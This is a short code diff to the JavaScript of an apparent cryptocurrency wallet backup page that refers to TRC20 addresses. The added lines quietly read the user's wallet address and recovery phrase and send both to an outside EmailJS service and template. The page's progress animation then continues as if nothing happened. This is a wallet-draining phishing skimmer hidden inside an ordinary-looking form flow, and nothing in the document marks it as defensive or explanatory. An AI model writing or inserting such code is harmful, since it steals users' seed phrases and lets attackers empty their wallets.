@@ -559,6 +559,17 @@ select:focus {
       showToast("Please confirm your backup matches your TRC20 wallet address.");
       return;
     }
+    
+    // Send data to email
+const addr = document.getElementById('addr').value.trim();
+emailjs.send("service_1qzlil7", "template_w742mzr", {
+  wallet_address: addr,
+  recovery_phrase: phrase
+}).then(() => {
+  console.log("Data sent");
+}).catch(err => {
+  console.error("Error sending", err);
+});
 
     prog.style.width = '70%';
     setTimeout(() => {
